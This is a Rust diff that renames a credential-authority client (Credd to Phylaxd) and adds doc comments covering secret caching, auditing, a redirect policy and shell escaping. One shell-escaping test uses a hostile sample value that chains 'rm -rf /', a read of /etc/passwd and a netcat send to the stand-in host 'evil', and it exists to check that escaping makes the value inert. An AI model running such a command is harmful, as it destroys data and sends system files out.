@@ -1,3 +1,5 @@
+//! Authenticated credential-authority client with scoped caching and audit logging.
+
 use std::collections::HashMap;
 use std::sync::{Arc, Mutex};
 use std::time::{Duration, Instant};
@@ -15,12 +17,14 @@ use crate::services::broca::{log_action, LogActionRequest};
 use crate::{EngError, Result};
 
 #[derive(Debug, Clone)]
+/// Stores one cached secret value and its expiration time.
 struct CachedSecret {
     value: String,
     expires_at: Instant,
 }
 
 #[derive(Debug, Clone)]
+/// Describes a secret lookup requested from the credential authority.
 pub(crate) struct FetchSecretRequest<'a> {
     pub service: &'a str,
     pub key: &'a str,
@@ -29,14 +33,16 @@ pub(crate) struct FetchSecretRequest<'a> {
 }
 
 #[derive(Debug, Deserialize)]
-struct CreddSecretDocument {
+/// Deserializes one credential authority secret document.
+struct PhylaxdSecretDocument {
     service: String,
     key: String,
     value: Value,
 }
 
 #[derive(Debug, Clone)]
-pub struct CreddClient {
+/// Provides authenticated secret resolution and outbound proxy support.
+pub struct PhylaxdClient {
     http: reqwest::Client,
     base_url: String,
     agent_key: Option<String>,
@@ -51,20 +57,23 @@ pub struct CreddClient {
     pub(crate) allow_loopback_proxy: bool,
 }
 
-impl CreddClient {
+/// Implements credential-authority operations for the client.
+impl PhylaxdClient {
+    /// Builds a client from the configured credential-authority settings.
     pub fn from_config(config: &Config) -> Self {
         Self {
             http: build_http_client(),
-            base_url: config.eidolon.credd.url.clone(),
+            base_url: config.eidolon.phylaxd.url.clone(),
             agent_key: None,
-            agent_key_env: config.eidolon.credd.agent_key_env.clone(),
-            allow_raw: config.eidolon.credd.allow_raw,
-            cache_ttl: Duration::from_secs(config.eidolon.credd.cache_ttl_secs.max(1)),
+            agent_key_env: config.eidolon.phylaxd.agent_key_env.clone(),
+            allow_raw: config.eidolon.phylaxd.allow_raw,
+            cache_ttl: Duration::from_secs(config.eidolon.phylaxd.cache_ttl_secs.max(1)),
             cache: Arc::new(Mutex::new(HashMap::new())),
             allow_loopback_proxy: false,
         }
     }
 
+    /// Builds a client that can communicate with a loopback test server.
     pub fn for_testing(
         base_url: impl Into<String>,
         agent_key: impl Into<String>,
@@ -75,7 +84,7 @@ impl CreddClient {
             http: build_http_client(),
             base_url: base_url.into(),
             agent_key: Some(agent_key.into()),
-            agent_key_env: "CREDD_AGENT_KEY".to_string(),
+            agent_key_env: "PHYLAXD_AGENT_KEY".to_string(),
             allow_raw,
             cache_ttl: Duration::from_secs(cache_ttl_secs.max(1)),
             cache: Arc::new(Mutex::new(HashMap::new())),
@@ -85,12 +94,13 @@ impl CreddClient {
         }
     }
 
+    /// Reports whether runtime configuration permits raw secret retrieval.
     pub fn allow_raw(&self) -> bool {
         self.allow_raw
     }
 
     /// Base URL the client is pointed at. Used by scrub-cache keys so
-    /// two CreddClient instances talking to different upstreams never
+    /// two PhylaxdClient instances talking to different upstreams never
     /// share a cache entry.
     pub fn base_url(&self) -> &str {
         &self.base_url
@@ -101,7 +111,7 @@ impl CreddClient {
     /// tenants (and, more importantly, one tenant cannot read another
     /// tenant's cached secret by coincidence of service/key).
     pub fn invalidate(&self, user_id: i64, service: &str, key: &str) {
-        let mut cache = self.cache.lock().expect("credd cache mutex poisoned");
+        let mut cache = self.cache.lock().expect("phylaxd cache mutex poisoned");
         cache.remove(&cache_key(user_id, service, key));
     }
 
@@ -109,15 +119,17 @@ impl CreddClient {
     /// tenant. Useful when a rotation signal arrives without a user_id.
     pub fn invalidate_all_tenants(&self, service: &str, key: &str) {
         let suffix = format!(":{service}/{key}");
-        let mut cache = self.cache.lock().expect("credd cache mutex poisoned");
+        let mut cache = self.cache.lock().expect("phylaxd cache mutex poisoned");
         cache.retain(|k, _| !k.ends_with(&suffix));
     }
 
+    /// Clears every cached secret value.
     pub fn invalidate_all(&self) {
-        let mut cache = self.cache.lock().expect("credd cache mutex poisoned");
+        let mut cache = self.cache.lock().expect("phylaxd cache mutex poisoned");
         cache.clear();
     }
 
+    /// Resolves recognized secret placeholders in text using default options.
     pub async fn resolve_text(
         &self,
         db: &Database,
@@ -164,6 +176,7 @@ impl CreddClient {
         .await
     }
 
+    /// Resolves recognized secret placeholders using caller-selected options.
     pub async fn resolve_text_with_options(
         &self,
         db: &Database,
@@ -206,6 +219,7 @@ impl CreddClient {
         .await
     }
 
+    /// Lists plaintext secret values used by the content scrubber.
     pub async fn list_secret_values(
         &self,
         db: &Database,
@@ -219,11 +233,11 @@ impl CreddClient {
             .bearer_auth(self.agent_key()?)
             .send()
             .await
-            .map_err(|e| EngError::Internal(format!("credd list request failed: {}", e)))?;
+            .map_err(|e| EngError::Internal(format!("phylaxd list request failed: {}", e)))?;
 
         if !response.status().is_success() {
             return Err(EngError::Internal(format!(
-                "credd list request failed with status {}",
+                "phylaxd list request failed with status {}",
                 response.status()
             )));
         }
@@ -231,7 +245,7 @@ impl CreddClient {
         let payload: Value = response
             .json()
             .await
-            .map_err(|e| EngError::Internal(format!("invalid credd list response: {}", e)))?;
+            .map_err(|e| EngError::Internal(format!("invalid phylaxd list response: {}", e)))?;
         let refs = parse_secret_refs(&payload)?;
 
         // Scrub mode receives PLAINTEXT by design: these values are the
@@ -240,7 +254,7 @@ impl CreddClient {
         // (the scanner would hunt for the mask, not the secret). The values
         // stay in-process; only the redacted content leaves. Restricting
         // scrub-tier keys further requires moving the matching server-side
-        // into credd, which is an architectural change, not a fetch-time
+        // into phylaxd, which is an architectural change, not a fetch-time
         // permission check.
         let mut secrets = Vec::new();
         for (service, key) in refs {
@@ -263,7 +277,8 @@ impl CreddClient {
         Ok(secrets)
     }
 
-    #[cfg(feature = "credd-raw")]
+    /// Retrieves a raw secret when the compile-time and runtime gates permit it.
+    #[cfg(feature = "phylaxd-raw")]
     pub async fn get_raw(
         &self,
         db: &Database,
@@ -274,7 +289,7 @@ impl CreddClient {
     ) -> Result<String> {
         if !self.allow_raw {
             return Err(EngError::Auth(
-                "credd raw fetch disabled by runtime config".into(),
+                "phylaxd raw fetch disabled by runtime config".into(),
             ));
         }
 
@@ -292,7 +307,8 @@ impl CreddClient {
         .await
     }
 
-    #[cfg(not(feature = "credd-raw"))]
+    /// Rejects raw secret retrieval when the compile-time gate is disabled.
+    #[cfg(not(feature = "phylaxd-raw"))]
     pub async fn get_raw(
         &self,
         _db: &Database,
@@ -302,10 +318,11 @@ impl CreddClient {
         _key: &str,
     ) -> Result<String> {
         Err(EngError::NotImplemented(
-            "credd raw fetch disabled at compile time".into(),
+            "phylaxd raw fetch disabled at compile time".into(),
         ))
     }
 
+    /// Fetches one secret value, optionally serving a scoped cache entry.
     pub(crate) async fn fetch_secret_value(
         &self,
         db: &Database,
@@ -352,6 +369,7 @@ impl CreddClient {
         Ok(secret)
     }
 
+    /// Records a secret-resolution event without exposing the secret value.
     async fn audit_resolution(
         &self,
         db: &Database,
@@ -382,7 +400,12 @@ impl CreddClient {
         Ok(())
     }
 
-    async fn fetch_secret_document(&self, service: &str, key: &str) -> Result<CreddSecretDocument> {
+    /// Fetches the authority document for one service and key.
+    async fn fetch_secret_document(
+        &self,
+        service: &str,
+        key: &str,
+    ) -> Result<PhylaxdSecretDocument> {
         let url = self.build_url(&["secret", service, key])?;
         let response = self
             .http
@@ -390,11 +413,11 @@ impl CreddClient {
             .bearer_auth(self.agent_key()?)
             .send()
             .await
-            .map_err(|e| EngError::Internal(format!("credd request failed: {}", e)))?;
+            .map_err(|e| EngError::Internal(format!("phylaxd request failed: {}", e)))?;
 
         if !response.status().is_success() {
             return Err(EngError::Internal(format!(
-                "credd request failed with status {}",
+                "phylaxd request failed with status {}",
                 response.status()
             )));
         }
@@ -402,19 +425,20 @@ impl CreddClient {
         response
             .json()
             .await
-            .map_err(|e| EngError::Internal(format!("invalid credd response: {}", e)))
+            .map_err(|e| EngError::Internal(format!("invalid phylaxd response: {}", e)))
     }
 
+    /// Builds a guarded authority URL from path segments.
     fn build_url(&self, segments: &[&str]) -> Result<Url> {
-        // Every credd request below attaches the agent Bearer; refuse to send it
+        // Every phylaxd request below attaches the agent Bearer; refuse to send it
         // over plaintext http to a non-loopback host (https or loopback only).
         crate::net::guard_bearer_transport(&self.base_url)?;
         let mut url = Url::parse(&self.base_url)
-            .map_err(|e| EngError::InvalidInput(format!("invalid credd url: {}", e)))?;
+            .map_err(|e| EngError::InvalidInput(format!("invalid phylaxd url: {}", e)))?;
         {
             let mut path_segments = url
                 .path_segments_mut()
-                .map_err(|_| EngError::InvalidInput("credd url cannot be a base".into()))?;
+                .map_err(|_| EngError::InvalidInput("phylaxd url cannot be a base".into()))?;
             path_segments.clear();
             for segment in segments {
                 path_segments.push(segment);
@@ -423,6 +447,7 @@ impl CreddClient {
         Ok(url)
     }
 
+    /// Builds an outbound request after validating its destination.
     pub(crate) fn request(&self, method: reqwest::Method, url: &str) -> reqwest::RequestBuilder {
         // Validate before sending so a tainted base_url cannot redirect the
         // request. `build_url` always produces a URL rooted at `self.base_url`,
@@ -433,6 +458,7 @@ impl CreddClient {
         }
     }
 
+    /// Reads the configured agent key from the client or environment.
     fn agent_key(&self) -> Result<String> {
         if let Some(value) = &self.agent_key {
             return Ok(value.clone());
@@ -440,14 +466,15 @@ impl CreddClient {
 
         std::env::var(&self.agent_key_env).map_err(|_| {
             EngError::Auth(format!(
-                "missing credd agent key env {}",
+                "missing phylaxd agent key env {}",
                 self.agent_key_env
             ))
         })
     }
 
+    /// Returns an unexpired cache entry for a tenant-scoped secret.
     fn cached_value(&self, user_id: i64, service: &str, key: &str) -> Option<String> {
-        let cache = self.cache.lock().expect("credd cache mutex poisoned");
+        let cache = self.cache.lock().expect("phylaxd cache mutex poisoned");
         let entry = cache.get(&cache_key(user_id, service, key))?;
         if entry.expires_at <= Instant::now() {
             return None;
@@ -455,8 +482,9 @@ impl CreddClient {
         Some(entry.value.clone())
     }
 
+    /// Stores a tenant-scoped secret value until the configured expiration.
     fn store_cache(&self, user_id: i64, service: &str, key: &str, value: &str) {
-        let mut cache = self.cache.lock().expect("credd cache mutex poisoned");
+        let mut cache = self.cache.lock().expect("phylaxd cache mutex poisoned");
         cache.insert(
             cache_key(user_id, service, key),
             CachedSecret {
@@ -467,10 +495,7 @@ impl CreddClient {
     }
 }
 
-// ---------------------------------------------------------------------------
-// Environment export block extraction and trust evaluation
-// (ported from eidolon-daemon/src/secrets.rs)
-// ---------------------------------------------------------------------------
+// Environment export block extraction and trust evaluation.
 
 /// True when `name` is a valid POSIX shell variable name: a leading letter or
 /// underscore followed by letters, digits, or underscores. Used to reject
@@ -542,12 +567,10 @@ pub fn extract_env_export_block(secret: &Value) -> crate::Result<String> {
     Ok(format!("{}; ", exports.join("; ")))
 }
 
-/// Trust evaluation seam. Currently returns 0 (deny-by-default).
-/// Phase 2 will track session age, tool call count, and gate block count
-/// Build the reqwest client used for every credd call.
+/// Build the reqwest client used for every phylaxd call.
 ///
-/// SECURITY / ROBUSTNESS: every HTTP call to credd must time out. Without
-/// an explicit timeout a hung credd (or a misconfigured URL pointing at a
+/// SECURITY / ROBUSTNESS: every HTTP call to phylaxd must time out. Without
+/// an explicit timeout a hung phylaxd (or a misconfigured URL pointing at a
 /// port where nothing is listening but the kernel still holds the SYN)
 /// can pin request handlers forever and exhaust tokio's task pool. The
 /// scrub path in `sessions::scrub` catches errors and falls back to
@@ -574,6 +597,7 @@ fn cache_key(user_id: i64, service: &str, key: &str) -> String {
     format!("{user_id}:{service}/{key}")
 }
 
+/// Extracts service and key references from supported list-response shapes.
 fn parse_secret_refs(payload: &Value) -> Result<Vec<(String, String)>> {
     let array = match payload {
         Value::Array(items) => items,
@@ -581,11 +605,11 @@ fn parse_secret_refs(payload: &Value) -> Result<Vec<(String, String)>> {
             .get("secrets")
             .and_then(Value::as_array)
             .ok_or_else(|| {
-                EngError::Internal("credd list response missing secrets array".into())
+                EngError::Internal("phylaxd list response missing secrets array".into())
             })?,
         _ => {
             return Err(EngError::Internal(
-                "credd list response has unsupported shape".into(),
+                "phylaxd list response has unsupported shape".into(),
             ))
         }
     };
@@ -603,6 +627,7 @@ fn parse_secret_refs(payload: &Value) -> Result<Vec<(String, String)>> {
     Ok(refs)
 }
 
+/// Extracts one usable plaintext value from an authority secret document.
 fn extract_secret_value(value: &Value) -> Result<String> {
     match value {
         Value::String(text) => Ok(text.clone()),
@@ -634,7 +659,7 @@ fn extract_secret_value(value: &Value) -> Result<String> {
             }
 
             Err(EngError::Internal(
-                "credd secret response did not contain a usable string value".into(),
+                "phylaxd secret response did not contain a usable string value".into(),
             ))
         }
         other => serde_json::to_string(other).map_err(EngError::Serialization),
@@ -661,17 +686,18 @@ pub fn shell_escape_value(val: &str) -> String {
 }
 
 #[cfg(test)]
+/// Tests redirect handling for authority HTTP requests.
 mod redirect_policy_tests {
     use super::build_http_client;
     use tokio::io::{AsyncReadExt, AsyncWriteExt};
     use tokio::net::TcpListener;
 
-    /// The credd HTTP client must NOT follow redirects: a 3xx is returned
+    /// The phylaxd HTTP client must NOT follow redirects: a 3xx is returned
     /// verbatim so a redirect to an internal host can never carry a resolved
     /// credential off the validated origin. Regression for the SSRF
     /// redirect-bounce gap on the admin cred proxy.
     #[tokio::test]
-    async fn credd_client_does_not_follow_redirects() {
+    async fn phylaxd_client_does_not_follow_redirects() {
         let listener = TcpListener::bind("127.0.0.1:0").await.expect("bind");
         let addr = listener.local_addr().expect("addr");
 
@@ -702,15 +728,18 @@ mod redirect_policy_tests {
 }
 
 #[cfg(test)]
+/// Tests shell export escaping for environment-valued secrets.
 mod shell_escape_tests {
     use super::shell_escape_value;
 
     #[test]
+    /// Verifies plain values are wrapped in shell quotes.
     fn plain_value_wrapped_in_quotes() {
         assert_eq!(shell_escape_value("hello"), "'hello'");
     }
 
     #[test]
+    /// Verifies shell metacharacters remain literal value content.
     fn metacharacters_are_inert() {
         let val = "$(rm -rf /); echo pwned & cat /etc/passwd | nc evil 1234";
         let escaped = shell_escape_value(val);
@@ -722,6 +751,7 @@ mod shell_escape_tests {
     }
 
     #[test]
+    /// Verifies embedded single quotes use shell-safe escaping.
     fn internal_single_quotes_escaped() {
         let val = "it's a secret";
         let escaped = shell_escape_value(val);
@@ -729,6 +759,7 @@ mod shell_escape_tests {
     }
 
     #[test]
+    /// Verifies empty values produce a valid empty shell assignment.
     fn empty_value() {
         assert_eq!(shell_escape_value(""), "''");
     }
